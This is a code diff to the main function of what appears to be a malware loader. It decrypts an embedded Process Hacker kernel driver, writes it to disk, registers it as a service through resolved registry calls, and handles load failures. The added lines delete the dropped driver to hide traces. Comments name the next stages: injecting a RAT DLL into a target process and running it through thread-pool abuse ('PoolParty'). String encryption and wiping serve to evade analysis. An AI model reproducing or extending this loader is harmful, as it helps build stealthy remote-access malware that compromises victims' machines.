@@ -41,9 +41,9 @@ int main(int argc, char** argv)
     */
     
     // Decrypt the driver path to write to disk
-    std::string kphDriverDesiredPath = decrypt_string(str_kphDriverPathOnDisk);
-    std::ofstream driver_ofstream(kphDriverDesiredPath.c_str(), std::ios::binary);
-    wipeStr(kphDriverDesiredPath);
+    std::string driverPath = decrypt_string(str_kphDriverPathOnDisk);
+    std::ofstream driver_ofstream(driverPath.c_str(), std::ios::binary);
+    wipeStr(driverPath);
 
     // Decrypt the driver from memory and write it to disk
     std::vector<uint8_t> kph_driver = decrypt_bytes(kprocesshacker_driver_encrypted);
@@ -79,7 +79,7 @@ int main(int argc, char** argv)
     std::string imagePath = decrypt_string(str_ImagePath);
     std::string driverNtPath = decrypt_string(str_kphDriverNtPath);
     status = RegSetKeyValueA_ptr(dservice, NULL, imagePath.c_str(), REG_EXPAND_SZ, driverNtPath.c_str(), (DWORD)(driverNtPath.size() + 1));
-    wipeStr(kphDriverDesiredPath);
+    wipeStr(driverPath);
     wipeStr(imagePath);
     if (status != ERROR_SUCCESS)
     {
@@ -139,7 +139,7 @@ int main(int argc, char** argv)
     if (ntStatus == 0xC0000603) // STATUS_IMAGE_CERT_REVOKED
     {   
 #ifdef _DEBUG
-        std::cerr << "Fatal Error: Couldn't load the driver because it has been blocked!\nError Code: 0x" << std::hex << ntStatus << "\nReason: STATUS_IMAGE_CERT_REVOKED" << std::endl;
+        std::cerr << "Fatal Error: Couldn't load the driver because it has been blocked.\nError Code: 0x" << std::hex << ntStatus << "\nReason: STATUS_IMAGE_CERT_REVOKED" << std::endl;
 #endif 
         return 1;
     }
@@ -147,12 +147,27 @@ int main(int argc, char** argv)
     else if (ntStatus == 0xC0000022 || ntStatus == 0xC000009A) // STATUS_ACCESS_DENIED and STATUS_INSUFFICIENT_RESOURCES
     {
 #ifdef _DEBUG
-        std::cerr << "Fatal Error: Couldn't load the driver due to Access Denied or Insufficient Resources!\nError Code: 0x" << std::hex << ntStatus << std::endl;
+        std::cerr << "Fatal Error: Couldn't load the driver due to Access Denied or Insufficient Resources.\nError Code: 0x" << std::hex << ntStatus << std::endl;
 #endif
         return 1;
     }
 
+    else if (!(ntStatus >= 0)) // !NT_SUCCESS(ntStatus)
+    {
+#ifdef _DEBUG
+        std::cerr << "Fatal Error: Couldn't load the driver due to unknown error code.\nError Code: 0x" << std::hex << ntStatus << std::endl;
+#endif 
+        return 1;
+    }
+
+    // Delete the driver file on disk
+    driverPath = decrypt_string(str_kphDriverPathOnDisk);
+    remove(driverPath.c_str());
+    wipeStr(driverPath);
+
+
     // Inject the RAT dll to the target process's virtual memory (after applying relocations)
+    
 
     // Execute the AddressOfEntryPoint of the dll in the target process via abusing Thread pools (PoolParty)
 	return 0;
